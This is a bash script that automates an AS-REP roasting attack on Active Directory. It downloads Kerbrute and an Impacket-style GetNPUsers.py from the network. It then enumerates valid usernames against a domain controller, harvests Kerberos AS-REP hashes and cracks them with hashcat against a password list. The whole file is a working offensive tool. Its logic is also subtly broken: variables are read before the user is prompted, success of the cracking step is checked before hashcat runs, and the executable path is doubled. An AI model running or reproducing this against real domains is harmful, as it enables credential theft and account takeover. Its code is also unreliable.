#!/bin/bash

GREEN='\033[0;32m'
RED='\033[0;31m'
RESET='\033[0m'

KERBRUTE_EXEC=""  # Will hold the path to the downloaded executable

# Function to detect OS and architecture
detect_os() {
    if [[ "$(uname)" == "Linux" ]]; then
        OS="Linux"
        ARCH=$(uname -m)
    elif [[ "$(uname)" == "Darwin" ]]; then
        OS="macOS"
        ARCH=$(uname -m)
    elif [[ "$(uname)" == "CYGWIN"* || "$(uname)" == "MINGW"* ]]; then
        OS="Windows"
        ARCH=$(uname -m)
    else
        OS="Unknown"
        ARCH=""
    fi
}

# Function to check if Kerbrute is already downloaded and executable
check_kerbrute_installed() {
    if [[ -f "$KERBRUTE_EXEC" && -x "$KERBRUTE_EXEC" ]]; then
        echo -e "${GREEN}[+] Kerbrute is already downloaded and executable.${RESET}"
        return 0  # Return success if executable exists and is runnable
    else
        return 1  # Return failure if not found or not executable
    fi
}

# Function to download the correct version of Kerbrute based on OS and architecture
download_kerbrute() {
    local filename=""
    
    if [ "$OS" == "Linux" ]; then
        if [ "$ARCH" == "x86_64" ]; then
            filename="kerbrute_linux_amd64"
            echo -e "${GREEN}[+] Downloading Kerbrute for Linux x86_64...${RESET}"
        else
            echo -e "${RED}[!] Unsupported architecture for Linux: $ARCH. Exiting.${RESET}"
            exit 1
        fi
    elif [ "$OS" == "macOS" ]; then
        if [ "$ARCH" == "x86_64" ]; then
            filename="kerbrute_darwin_amd64"
            echo -e "${GREEN}[+] Downloading Kerbrute for macOS x86_64...${RESET}"
        else
            echo -e "${RED}[!] Unsupported architecture for macOS: $ARCH. Exiting.${RESET}"
            exit 1
        fi
    elif [ "$OS" == "Windows" ]; then
        if [ "$ARCH" == "x86_64" ]; then
            filename="kerbrute_windows_amd64.exe"
            echo -e "${GREEN}[+] Downloading Kerbrute for Windows x86_64...${RESET}"
        else
            echo -e "${RED}[!] Unsupported architecture for Windows: $ARCH. Exiting.${RESET}"
            exit 1
        fi
    else
        echo -e "${RED}[!] Unsupported OS: $OS. Exiting.${RESET}"
        exit 1
    fi

    # Check if Kerbrute is already downloaded
    if [ ! -f "./$filename" ]; then
        # Download the selected file
        curl -LO "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/$filename"
        if [ -f "$filename" ]; then
            chmod +x "$filename"  # Make it executable
            KERBRUTE_EXEC="./$filename"  # Set the correct path for execution
            echo -e "${GREEN}[+] Kerbrute downloaded and made executable successfully.${RESET}"
        else
            echo -e "${RED}[!] Failed to download the file. Exiting.${RESET}"
            exit 1
        fi
    else
        chmod +x "$filename"  # Make the existing file executable if it's already downloaded
        KERBRUTE_EXEC="./$filename"  # Set the correct path for execution
        echo -e "${GREEN}[+] Kerbrute is already downloaded and was made executable.${RESET}"
    fi
}

# Check if the script is running as sudo
if [ "$(id -u)" -ne 0 ]; then
  echo -e "${RED}[!] This script needs to be run as root (sudo). Exiting.${RESET}"
  exit 1
fi

# Main script starts here
DOMAIN=$FDN
USERS_FILE=$userpath
DC_IP=$DCIP
KERBRUTE_OUTPUT="$DOMAIN/$DOMAIN-Kerbrute-Output.txt"
VALID_USERS_FILE="$DOMAIN/$DOMAIN-Valid-Users.txt"
TMP_ROAST_FILE="$DOMAIN/$DOMAIN-TMP-Roast.txt"
ASREP_ROAST_FILE="$DOMAIN/$DOMAIN-hashes.txt"
PASS_FILE_PATH=$passpath
CRACKED_FILE_PATH="$DOMAIN/$DOMAIN-Cracked.txt"



# Check if Kerbrute is installed and executable
if ! check_kerbrute_installed; then
    echo -e "${GREEN}[+] Kerbrute is not installed. Proceeding with installation...${RESET}"
    detect_os
    download_kerbrute
else
    echo -e "${GREEN}[+] Kerbrute is already downloaded and executable. Skipping installation.${RESET}"
fi

# Check if GetNPUsers.py is in the current directory
if [ ! -f "./GetNPUsers.py" ]; then
  echo -e "${RED}[!] GetNPUsers.py not found. Downloading...${RESET}"
  curl -LO https://raw.githubusercontent.com/byt3bl33d3r/kerberos-tools/master/GetNPUsers.py
  echo -e "${GREEN}[+] GetNPUsers.py downloaded successfully.${RESET}"
else
  echo -e "${GREEN}[+] GetNPUsers.py is already present.${RESET}"
fi

# Ask user for domain name, DC IP, username, and password files
echo -e "${GREEN}Please enter full domain name:${RESET}"
read FDN

echo -e "${GREEN}Please enter Domain Controller IP:${RESET}"
read DCIP

echo -e "${GREEN}Please enter the path to your username file:${RESET}"
read userpath

echo -e "${GREEN}Please enter the path to your password file:${RESET}"
read passpath

# Check if the directory exists already
if [ ! -d "$DOMAIN" ]; then
  echo -e "${GREEN}[+] Making Dir for $DOMAIN${RESET}"
  mkdir -p $DOMAIN
else
  echo -e "${RED}[-] Directory $DOMAIN already exists, skipping creation.${RESET}"
fi

# Check if Kerbrute output file exists
if [[ -f "$KERBRUTE_OUTPUT" ]]; then
    echo -e "${RED}[-] $KERBRUTE_OUTPUT already exists. Do you want to re-run Kerbrute? (yes/no)${RESET}"
    read user_choice
    if [[ "$user_choice" == "yes" ]]; then
        echo -e "${GREEN}[+] Running Kerbrute user enumeration...${RESET}"
        ./$KERBRUTE_EXEC userenum --domain $DOMAIN $USERS_FILE --dc $DC_IP > "$KERBRUTE_OUTPUT"
    else
        echo -e "${GREEN}[+] Skipping Kerbrute user enumeration.${RESET}"
    fi
else
    echo -e "${GREEN}[+] Running Kerbrute user enumeration...${RESET}"
    ./$KERBRUTE_EXEC userenum --domain $DOMAIN $USERS_FILE --dc $DC_IP > "$KERBRUTE_OUTPUT"
fi

# Extract valid usernames, clean them up, normalize case, and deduplicate
grep "VALID USERNAME" "$KERBRUTE_OUTPUT" \
  | sed -E 's/\x1b\[[0-9;]*m//g' \
  | sed -E 's/.*VALID USERNAME:[[:space:]]*//' \
  | tr -d '\r' \
  | tr '[:upper:]' '[:lower:]' \
  | sort -u \
  > "$VALID_USERS_FILE" 

if [[ ! -s "$VALID_USERS_FILE" ]]; then
  echo -e "${RED}[!] No valid users found. Exiting.${RESET}"
  exit 1
fi

echo -e "${GREEN}[+] Found $(wc -l < "$VALID_USERS_FILE") Valid Users"
python3 GetNPUsers.py $DOMAIN/ -usersfile "$VALID_USERS_FILE" -no-pass -dc-ip $DC_IP > "$TMP_ROAST_FILE"

if [[ ! -f "$TMP_ROAST_FILE" ]]; then
    echo -e "${RED}[!] Roast file not found. Exiting.${RESET}"
    exit 1
fi

# Extract hashes containing "$krb5asrep$23$" and append them to the hash file
grep -o '\$krb5asrep\$23\$[^ ]*' "$TMP_ROAST_FILE" >> "$ASREP_ROAST_FILE"

if [[ -f "$CRACKED_FILE_PATH" && -s "$CRACKED_FILE_PATH" ]]; then
  echo -e "${GREEN}[+] Hashes successfully cracked. Cracked passwords saved in $CRACKED_FILE_PATH.${RESET}"
else
  echo -e "${RED}[!] Hash cracking failed. Exiting.${RESET}"
  exit 1
fi

# Check if any hashes were extracted
if [[ -s "$ASREP_ROAST_FILE" ]]; then
    echo -e "${GREEN}[+] Hashes extracted to $ASREP_ROAST_FILE"
else
    echo -e "${RED}[!] No hashes found. Exiting.${RESET}"
    exit 1
fi

echo -e "${GREEN}[+] Passing hashes into Hashcat to crack with module 18200 (Kerberos ASREP Roastable Module).${RESET}"
hashcat -m 18200 -a 0 $ASREP_ROAST_FILE $PASS_FILE_PATH > $CRACKED_FILE_PATH
